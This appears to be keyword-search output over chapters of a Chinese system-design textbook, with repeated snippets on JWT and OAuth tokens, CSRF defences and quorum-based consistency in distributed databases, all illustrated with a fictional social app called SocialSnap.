  c19_b03.md: ...JWT 安全考虑  JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤销。如果用户账户被入侵，你想立即失效其 token，除非维护 token 黑名单（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使...
  c19_b03.md: ...JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤销。如果用户账户被入侵，你想立即失效其 token，除非维护 token 黑名单（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使用短生命周期的 acc...
  c19_b03.md: ...（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token...
  c19_b03.md: ...否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝...
  c19_b03.md: ...token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token—...
  c19_b03.md: ...的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效...
  c19_b03.md: ...token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b03.md: ...存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b03.md: ...er。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 token 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access toke...
  c19_b03.md: ...oken 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 acces...
  c19_b03.md: ...er，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization...
  c19_b03.md: ...和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并...
  c19_b03.md: ...s token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 re...
  c19_b03.md: ...er eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token...
  c19_b03.md: ...限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享...
  c19_b03.md: ...token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持...
  c19_b03.md: ...。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 PostSche...
  c19_b03.md: ...权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON Web Toke...
  c19_b03.md: ...r 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT...
  c19_b03.md: ...#### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字符串，编码一个 JSON payload。  JWT...
  c19_b03.md: ...签名的字符串，编码一个 JSON payload。  JWT 由点分隔的三部分组成：  **Header**（用于签名 token 的算法）：`{"alg": "RS256", "typ": "JWT"}`  **Payload**（claims——...
  c19_b03.md: ...`{"alg": "RS256", "typ": "JWT"}`  **Payload**（claims——关于用户和 token 的断言）：       {       "sub": "user_8821934",       "name": "A...
  c19_b03.md: ...}   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflKxwRJSMeKKF2...`  Feed Service...
  c19_b03.md: ...Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `use...
  c19_b03.md: ...ope` 而无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是无状态认证：服务器不需要查数据库来验证 token。token 是自包含的。   #### JWT 安全考虑  JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤...
  c19_b03.md: ...无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是无状态认证：服务器不需要查数据库来验证 token。token 是自包含的。   #### JWT 安全考虑  JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤销。如果用户...
  c19_b03.md: ...JWT 安全考虑  JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤销。如果用户账户被入侵，你想立即失效其 token，除非维护 token 黑名单（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使...
  c19_b03.md: ...JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤销。如果用户账户被入侵，你想立即失效其 token，除非维护 token 黑名单（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使用短生命周期的 acc...
  c19_b03.md: ...（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token...
  c19_b03.md: ...否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝...
  c19_b03.md: ...token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token—...
  c19_b03.md: ...的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效...
  c19_b03.md: ...token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b03.md: ...存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b07.md: ...lSnap 看到带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345。  修复方法：**CSRF token**。SocialSnap 渲染每个表单时生成一个随机的、用户特定的 token，并作为隐藏字段包含。浏览器提交表单时附...
  c19_b07.md: ...12345。  修复方法：**CSRF token**。SocialSnap 渲染每个表单时生成一个随机的、用户特定的 token，并作为隐藏字段包含。浏览器提交表单时附带该 token。SocialSnap 处理请求前验证 token。由于 `ev...
  c19_b07.md: ...SocialSnap 渲染每个表单时生成一个随机的、用户特定的 token，并作为隐藏字段包含。浏览器提交表单时附带该 token。SocialSnap 处理请求前验证 token。由于 `evil.com` 无法读取 SocialSnap 表单中的...
  c19_b07.md: ...、用户特定的 token，并作为隐藏字段包含。浏览器提交表单时附带该 token。SocialSnap 处理请求前验证 token。由于 `evil.com` 无法读取 SocialSnap 表单中的 CSRF token（被同源策略阻止），它无法伪...
  c19_b07.md: ...lSnap 处理请求前验证 token。由于 `evil.com` 无法读取 SocialSnap 表单中的 CSRF token（被同源策略阻止），它无法伪造有效请求。  **SameSite cookie 属性** 是现代防御：在会话 cooki...
  c19_b08.md: ...何网络链路都可能被入侵，并对每次服务调用都要求认证和授权，即使是内部调用。  在零信任系统中：  * 每个服务用证书或 token 认证其他每个服务（mutual TLS 或带短生命周期 token 的服务账户） * 每个服务验证调用服务是否有权发起...
  c19_b08.md: ...调用。  在零信任系统中：  * 每个服务用证书或 token 认证其他每个服务（mutual TLS 或带短生命周期 token 的服务账户） * 每个服务验证调用服务是否有权发起特定请求（Feed Service 允许调用 Post Servic...
  c19_b10.md: ...无降级 | 低 | 无状态认证 参数化查询 | 无 | 无 | 无（只要正确写代码） | 防止 SQL 注入 CSRF token | 可忽略 | 无 | 低 | 防止 CSRF 零信任 mTLS | 中（每次连接握手） | 略降（证书过期导致失败）...
  c19_b10.md: ...可忽略（硬件加速） | 无降级 | 低（密钥管理） | 防止磁盘被盗  观察：大多数基础安全实践（参数化查询、CSRF token、TLS）开销可忽略。昂贵的是零信任 mTLS——它是否值得取决于威胁模型。  你的威胁模型是什么？一个没有已知对手、没...
  c19_b14.md: ...nap 颁发 `client_id`（公开）和 `client_secret`（私密，仅 server-side 用于 token 交换）。  **授权流程（OAuth 2.0 Authorization Code）：**  1. 用户点击第三方应用...
  c19_b14.md: ..._id`、`client_secret` 和 `AUTH_CODE` 发到 `socialsnap.com/oauth/token`（server-to-server，永远不在用户浏览器中）。 6. SocialSnap 返回 `access_tok...
  c19_b14.md: ...ader。SocialSnap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。Social...
  c19_b14.md: ...JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（serve...
  c19_b14.md: ...m，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token...
  c19_b14.md: ...授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 acce...
  c19_b14.md: ...token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问...
  c19_b14.md: ...。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到...
  c19_b14.md: ...服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到“Connected Apps”，...
  c19_b14.md: ...ap 设置，看到“Connected Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——...
  c19_b14.md: ...ps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **O...
  c19_b14.md: ...ialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token 数据库 s...
  c19_b14.md: ...ccess token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token 数据库 schema：**  * `oauth_apps`：client_id, client_secret_hash...
  c19_b14.md: ...nap 颁发 `client_id`（公开）和 `client_secret`（私密，仅 server-side 用于 token 交换）。  **授权流程（OAuth 2.0 Authorization Code）：**  1. 用户点击第三方应用...
  c19_b14.md: ..._id`、`client_secret` 和 `AUTH_CODE` 发到 `socialsnap.com/oauth/token`（server-to-server，永远不在用户浏览器中）。 6. SocialSnap 返回 `access_tok...
  c19_b14.md: ...ader。SocialSnap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。Social...
  c19_b14.md: ...JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（serve...
  c19_b14.md: ...m，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token...
  c19_b14.md: ...授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 acce...
  c19_b14.md: ...token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问...
  c19_b14.md: ...。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到...
  c19_b14.md: ...服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到“Connected Apps”，...
  c19_b14.md: ...ap 设置，看到“Connected Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——...
  c19_b14.md: ...ps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **O...
  c19_b14.md: ...ialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token 数据库 s...
  c19_b14.md: ...ccess token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token 数据库 schema：**  * `oauth_apps`：client_id, client_secret_hash...
  c19_b17.md: ...XSS、CSRF——都共享一个根因：把用户输入当作可信代码或可信状态。防御措施——参数化查询、HTML 转义、CSRF token——都共享同一原则：把代码与数据分开。  零信任架构放弃边界模型，要求每次服务调用都进行认证和授权。攻击者作为对抗性侦探...
  c19_b17.md: ...。  安全权衡与所有系统设计权衡一样可量化。威胁模型决定哪些防御是必要的。大多数基础实践（参数化查询、TLS、CSRF token）运营成本可忽略，应普遍采用。昂贵的防御（零信任 mTLS、字段级加密）应在风险证明成本合理的地方应用。  第四部分到此...
  c23_b05.md: ...HTML 提取干净文本。移除 HTML 标签、JavaScript、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "D...
  c23_b05.md: ...转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见词，这些词对相关性贡献很小："the"、"is"、"and...
  c23_b05.md: ...）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到 token 的 posting list。  该流水线对每个爬取页面运行。100...
  c23_b05.md: ...system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到 token 的 posting list。  该流水线对每个爬取页面运行。100 亿（10 billion）页面，且为保持索引新鲜...
  c26_b06.md: ...的键值存储及其 quorum 配置：**  **会话存储**（SocialSnap v4，第 11 章）：存储用户会话 token。N=3，W=2，R=2。会话需要 read-your-writes 一致性（你登录后，下个请求必须找到会话）。W +...
  c26_b06.md: ...话）。W + R = 4 > N = 3，读 quorum 保证与写 quorum 重叠，确保每次读都看到最新写。会话 token 若连 1 个请求都未持久化就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）...
  c27_b03.md: ...地内存移到 Redis。团队发现“只加服务器”要求应用设计成无状态。  **关键决策：**  * 基于 JWT 的会话 token 用于认证（无状态——token 包含用户 ID 并通过加密验证） * 或服务器端 Redis 会话（集中状态，但快速）...
  c27_b03.md: ...“只加服务器”要求应用设计成无状态。  **关键决策：**  * 基于 JWT 的会话 token 用于认证（无状态——token 包含用户 ID 并通过加密验证） * 或服务器端 Redis 会话（集中状态，但快速） * 团队最终两者都用：JWT...
  c28_b06.md: ...决定展示哪个 UI 版本——在边缘完成，无需回源往返。 * **请求认证：** 在把请求转发到源站前在边缘验证 JWT token。未认证请求在最近的城市被拒绝，减少源站负载。 * **个性化：** 在边缘把用户特定内容（用户名、语言偏好）注入缓存页...

=== quorum (118 occurrences) ===
  c14_b04.md: ...分区期间选 C 还是选 A。正常操作（无分区）时，大多数系统同时提供一致性和可用性。   ### 14.5 复制因子与 Quorum——可调一致性  在“始终强一致”和“始终最终一致”之间有一系列可配置选项。Cassandra、DynamoDB、Ria...
  c14_b04.md: ...和“始终最终一致”之间有一系列可配置选项。Cassandra、DynamoDB、Riak 等分布式数据库允许你通过 **quorum** 机制按操作配置一致性级别。   #### 定义：复制因子  **复制因子（replication factor）*...
  c14_b04.md: ...分区期间选 C 还是选 A。正常操作（无分区）时，大多数系统同时提供一致性和可用性。   ### 14.5 复制因子与 Quorum——可调一致性  在“始终强一致”和“始终最终一致”之间有一系列可配置选项。Cassandra、DynamoDB、Ria...
  c14_b04.md: ...和“始终最终一致”之间有一系列可配置选项。Cassandra、DynamoDB、Riak 等分布式数据库允许你通过 **quorum** 机制按操作配置一致性级别。   #### 定义：复制因子  **复制因子（replication factor）*...
  c14_b05.md: ...#### 定义：Quorum  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 qu...
  c14_b05.md: ...#### 定义：Quorum  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 quorum（W）：**...
  c14_b05.md: ...um  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 quorum（W）：** 确认一次写前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返...
  c14_b05.md: ...少节点数。在 N 个副本的系统中：  * **写 quorum（W）：** 确认一次写前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的...
  c14_b05.md: ...。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的多数投票。一次写需要 W 票确认；一次读需要 R 票才能继续。巧妙之处在于，通过精心选择 W 和 R，可...
  c14_b05.md: ...妙之处在于，通过精心选择 W 和 R，可以保证读和写的集合始终重叠。  关键洞见：如果 `W + R > N`，那么读 quorum 和写 quorum 必须重叠。至少一个参与了最近写入的节点也必须参与读。那个节点拥有最新值。因此，读保证返回最近写入。...
  c14_b05.md: ...选择 W 和 R，可以保证读和写的集合始终重叠。  关键洞见：如果 `W + R > N`，那么读 quorum 和写 quorum 必须重叠。至少一个参与了最近写入的节点也必须参与读。那个节点拥有最新值。因此，读保证返回最近写入。  例如，N=3 个...
  c14_b05.md: ...3 个副本响应（慢，且任一副本故障读就阻塞）。如果你能容忍读重惩罚，写就快。 * W=2, R=2：N=3 时的“经典 quorum”。写需要 3 个中的 2 个。读需要 3 个中的 2 个。因为 W+R=4 > N=3，保证重叠。这提供强一致性，同时...
  c14_b05.md: ...N=3，保证重叠。这提供强一致性，同时容忍一个节点故障（第三个节点不可用也不影响可用性）。 * W=1, R=1：两个 quorum 要求都没满足。最大吞吐，最大可用性，没有一致性保证。读可能返回陈旧数据。这本质上是最终一致性。   #### 实践中的...
  c14_b05.md: ...实践中的可调一致性  Cassandra、DynamoDB（多种模式）和类似系统允许你按操作指定一致性级别：  * `QUORUM`：W=floor(N/2)+1，R=floor(N/2)+1——默认强一致性。 * `ONE`：W=1 或 R=1——...
  c14_b05.md: ...* `ONE`：W=1 或 R=1——最终一致性，最快速度。 * `LOCAL_QUORUM`：只在本地数据中心内达到 quorum（对跨区域部署有用，因为跨区域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consist...
  c14_b05.md: ...速度。 * `LOCAL_QUORUM`：只在本地数据中心内达到 quorum（对跨区域部署有用，因为跨区域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consistency）**：在每次操作 basis 上交换一致性、...
  c14_b05.md: ...cy）**：在每次操作 basis 上交换一致性、可用性和延迟的能力。陈旧可接受的操作用 ONE。陈旧不可接受的操作用 QUORUM。  对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用...
  c14_b05.md: ...对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用 QUORUM——你需要告诉用户“支付已确认”前，写已持久化到多个节点。   ### 14.6 反熵与提示移交（Anti-Entrop...
  c14_b05.md: ...。   ### 14.6 反熵与提示移交（Anti-Entropy and Hinted Handoff）  即使使用 quorum 写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到...
  c14_b05.md: ...写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，...
  c14_b05.md: ...点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，它的数据是陈旧的。两种机制处理这种情...
  c14_b05.md: ...#### 定义：Quorum  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 qu...
  c14_b05.md: ...#### 定义：Quorum  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 quorum（W）：**...
  c14_b05.md: ...um  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 quorum（W）：** 确认一次写前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返...
  c14_b05.md: ...少节点数。在 N 个副本的系统中：  * **写 quorum（W）：** 确认一次写前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的...
  c14_b05.md: ...。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的多数投票。一次写需要 W 票确认；一次读需要 R 票才能继续。巧妙之处在于，通过精心选择 W 和 R，可...
  c14_b05.md: ...妙之处在于，通过精心选择 W 和 R，可以保证读和写的集合始终重叠。  关键洞见：如果 `W + R > N`，那么读 quorum 和写 quorum 必须重叠。至少一个参与了最近写入的节点也必须参与读。那个节点拥有最新值。因此，读保证返回最近写入。...
  c14_b05.md: ...选择 W 和 R，可以保证读和写的集合始终重叠。  关键洞见：如果 `W + R > N`，那么读 quorum 和写 quorum 必须重叠。至少一个参与了最近写入的节点也必须参与读。那个节点拥有最新值。因此，读保证返回最近写入。  例如，N=3 个...
  c14_b05.md: ...3 个副本响应（慢，且任一副本故障读就阻塞）。如果你能容忍读重惩罚，写就快。 * W=2, R=2：N=3 时的“经典 quorum”。写需要 3 个中的 2 个。读需要 3 个中的 2 个。因为 W+R=4 > N=3，保证重叠。这提供强一致性，同时...
  c14_b05.md: ...N=3，保证重叠。这提供强一致性，同时容忍一个节点故障（第三个节点不可用也不影响可用性）。 * W=1, R=1：两个 quorum 要求都没满足。最大吞吐，最大可用性，没有一致性保证。读可能返回陈旧数据。这本质上是最终一致性。   #### 实践中的...
  c14_b05.md: ...实践中的可调一致性  Cassandra、DynamoDB（多种模式）和类似系统允许你按操作指定一致性级别：  * `QUORUM`：W=floor(N/2)+1，R=floor(N/2)+1——默认强一致性。 * `ONE`：W=1 或 R=1——...
  c14_b05.md: ...* `ONE`：W=1 或 R=1——最终一致性，最快速度。 * `LOCAL_QUORUM`：只在本地数据中心内达到 quorum（对跨区域部署有用，因为跨区域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consist...
  c14_b05.md: ...速度。 * `LOCAL_QUORUM`：只在本地数据中心内达到 quorum（对跨区域部署有用，因为跨区域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consistency）**：在每次操作 basis 上交换一致性、...
  c14_b05.md: ...cy）**：在每次操作 basis 上交换一致性、可用性和延迟的能力。陈旧可接受的操作用 ONE。陈旧不可接受的操作用 QUORUM。  对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用...
  c14_b05.md: ...对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用 QUORUM——你需要告诉用户“支付已确认”前，写已持久化到多个节点。   ### 14.6 反熵与提示移交（Anti-Entrop...
  c14_b05.md: ...。   ### 14.6 反熵与提示移交（Anti-Entropy and Hinted Handoff）  即使使用 quorum 写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到...
  c14_b05.md: ...写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，...
  c14_b05.md: ...点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，它的数据是陈旧的。两种机制处理这种情...
  c14_b05.md: ...#### 定义：Quorum  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 qu...
  c14_b05.md: ...#### 定义：Quorum  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 quorum（W）：**...
  c14_b05.md: ...um  **Quorum** 是系统认为操作成功前，参与读或写操作的最少节点数。在 N 个副本的系统中：  * **写 quorum（W）：** 确认一次写前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返...
  c14_b05.md: ...少节点数。在 N 个副本的系统中：  * **写 quorum（W）：** 确认一次写前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的...
  c14_b05.md: ...。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的多数投票。一次写需要 W 票确认；一次读需要 R 票才能继续。巧妙之处在于，通过精心选择 W 和 R，可...
  c14_b05.md: ...妙之处在于，通过精心选择 W 和 R，可以保证读和写的集合始终重叠。  关键洞见：如果 `W + R > N`，那么读 quorum 和写 quorum 必须重叠。至少一个参与了最近写入的节点也必须参与读。那个节点拥有最新值。因此，读保证返回最近写入。...
  c14_b05.md: ...选择 W 和 R，可以保证读和写的集合始终重叠。  关键洞见：如果 `W + R > N`，那么读 quorum 和写 quorum 必须重叠。至少一个参与了最近写入的节点也必须参与读。那个节点拥有最新值。因此，读保证返回最近写入。  例如，N=3 个...
  c14_b05.md: ...3 个副本响应（慢，且任一副本故障读就阻塞）。如果你能容忍读重惩罚，写就快。 * W=2, R=2：N=3 时的“经典 quorum”。写需要 3 个中的 2 个。读需要 3 个中的 2 个。因为 W+R=4 > N=3，保证重叠。这提供强一致性，同时...
  c14_b05.md: ...N=3，保证重叠。这提供强一致性，同时容忍一个节点故障（第三个节点不可用也不影响可用性）。 * W=1, R=1：两个 quorum 要求都没满足。最大吞吐，最大可用性，没有一致性保证。读可能返回陈旧数据。这本质上是最终一致性。   #### 实践中的...
  c14_b05.md: ...实践中的可调一致性  Cassandra、DynamoDB（多种模式）和类似系统允许你按操作指定一致性级别：  * `QUORUM`：W=floor(N/2)+1，R=floor(N/2)+1——默认强一致性。 * `ONE`：W=1 或 R=1——...
  c14_b05.md: ...* `ONE`：W=1 或 R=1——最终一致性，最快速度。 * `LOCAL_QUORUM`：只在本地数据中心内达到 quorum（对跨区域部署有用，因为跨区域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consist...
  c14_b05.md: ...速度。 * `LOCAL_QUORUM`：只在本地数据中心内达到 quorum（对跨区域部署有用，因为跨区域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consistency）**：在每次操作 basis 上交换一致性、...
  c14_b05.md: ...cy）**：在每次操作 basis 上交换一致性、可用性和延迟的能力。陈旧可接受的操作用 ONE。陈旧不可接受的操作用 QUORUM。  对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用...
  c14_b05.md: ...对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用 QUORUM——你需要告诉用户“支付已确认”前，写已持久化到多个节点。   ### 14.6 反熵与提示移交（Anti-Entrop...
  c14_b05.md: ...。   ### 14.6 反熵与提示移交（Anti-Entropy and Hinted Handoff）  即使使用 quorum 写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到...
  c14_b05.md: ...写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，...
  c14_b05.md: ...点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，它的数据是陈旧的。两种机制处理这种情...
  c14_b08.md: ...读取，美国节点可能还没有欧洲写入——跨区域复制有数百毫秒延迟。美国用户看到陈旧数据。  为避免这点，你可以要求**全局 quorum**：一次写必须被欧洲和美国节点都确认才完成。这保证一致性，但给每次写增加 150-300 毫秒延迟（等待跨区确认）。对...
